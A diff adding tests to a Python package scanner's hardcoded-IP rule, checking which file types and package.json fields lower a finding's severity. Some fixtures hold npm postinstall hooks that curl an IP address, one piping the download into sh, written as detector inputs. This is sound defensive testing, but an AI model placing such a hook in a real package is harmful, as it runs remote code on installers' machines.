@@ -11,6 +11,7 @@ from kitsunox.core.models import (
     ArtifactRef,
     Candidate,
     Change,
+    Finding,
     PackageBatch,
     PackageVersionRef,
     PublishInfo,
@@ -409,3 +410,80 @@ def test_any_rule_matching_only_in_a_file_that_never_runs_is_low(tmp_path: Path)
     by_path = {f.evidence[0].path: f for f in result.findings if f.rule_id == "static.hardcoded-ip"}
     assert by_path["node_modules/agent/README.md"].severity is Severity.LOW
     assert by_path["lib/x.js"].severity is Severity.MEDIUM
+
+
+def _ip_findings(tmp_path: Path, files: dict[str, bytes]) -> list[Finding]:
+    one = PackageBatch(
+        ecosystem="npm", name="kx", base=snapshot("1.0.0"), versions=(candidate("1.0.1", 5),)
+    )
+    (result,) = analyse_batch(
+        one, lambda s: files if s.ref.version == "1.0.1" else {}, ContentCache(tmp_path, RULES)
+    ).versions
+    return [f for f in result.findings if f.rule_id == "static.hardcoded-ip"]
+
+
+IP = b"http://45.33.32.156:8080/x"
+
+
+def test_an_ip_in_data_or_tests_is_low(tmp_path: Path) -> None:
+    """`static.hardcoded-ip` v3 (F4b): markup, tables, lockfiles, notices and `*.test.js`
+    hold data; code and `.json` config (an app loads it) still count."""
+    files = {
+        "site/index.html": b"<a href='" + IP + b"'>x</a>",
+        "data/hosts.csv": b"name,url\nx," + IP,
+        "THIRD_PARTY_NOTICES.md.in": IP,
+        "NOTICE": IP,
+        "yarn.lock": IP,
+        "lib/client.test.js": b"get('" + IP + b"')",
+        "lib/x.js": b"fetch('" + IP + b"')",
+        "config/app.json": b'{"api": "' + IP + b'"}',
+    }
+    found = {f.evidence[0].path: f for f in _ip_findings(tmp_path, files)}
+    assert {p for p, f in found.items() if f.severity is Severity.MEDIUM} == {
+        "lib/x.js",
+        "config/app.json",
+    }
+    assert found["lib/client.test.js"].explanation.endswith("not code that runs.")
+
+
+def test_an_ip_in_package_json_metadata_is_low(tmp_path: Path) -> None:
+    """F4b: `package.json`'s own repository, homepage and bugs URLs are metadata; the same URL
+    in a hook's command, or any other field, still counts."""
+    manifest = {
+        "homepage": "http://45.33.32.156/home",
+        "repository": {"type": "git", "url": "http://45.33.32.156/kx.git"},
+        "config": {"url": "http://45.33.32.157/api"},
+    }
+    found = _ip_findings(tmp_path, {"package.json": json.dumps(manifest, indent=1).encode()})
+    assert [(f.evidence[0].line_start, f.severity) for f in found] == [
+        (2, Severity.LOW),
+        (5, Severity.LOW),
+        (8, Severity.MEDIUM),
+    ]
+    assert found[0].explanation.endswith("repository, homepage or bugs URL.")
+    hooked = {
+        "bugs": "http://45.33.32.156/i",
+        "scripts": {"postinstall": "curl http://45.33.32.156/i"},
+    }
+    found = _ip_findings(tmp_path, {"package.json": json.dumps(hooked, indent=1).encode()})
+    assert [f.severity for f in found] == [Severity.MEDIUM, Severity.MEDIUM]
+    one_line = json.dumps({"homepage": "http://45.33.32.156/home"}).encode()
+    (minified,) = _ip_findings(tmp_path, {"package.json": one_line})
+    assert minified.severity is Severity.MEDIUM
+    (broken,) = _ip_findings(tmp_path, {"package.json": b'{\n"homepage": "http://45.33.32.156/"\n'})
+    assert broken.severity is Severity.MEDIUM
+    elsewhere = {"lib/package.json": json.dumps(manifest, indent=1).encode()}
+    assert {f.severity for f in _ip_findings(tmp_path, elsewhere)} == {Severity.MEDIUM}
+
+
+def test_package_json_metadata_at_the_match_cap_stays(tmp_path: Path) -> None:
+    """Three metadata URLs fill the rule's cap of matches; a fourth IP (a hook's) would go
+    unseen, so none of them is taken for metadata then."""
+    manifest = {
+        "homepage": "http://45.33.32.156/a",
+        "bugs": "http://45.33.32.156/b",
+        "repository": "http://45.33.32.156/c",
+        "scripts": {"postinstall": "curl http://45.33.32.158/p | sh"},
+    }
+    found = _ip_findings(tmp_path, {"package.json": json.dumps(manifest, indent=1).encode()})
+    assert [f.severity for f in found] == [Severity.MEDIUM] * 3
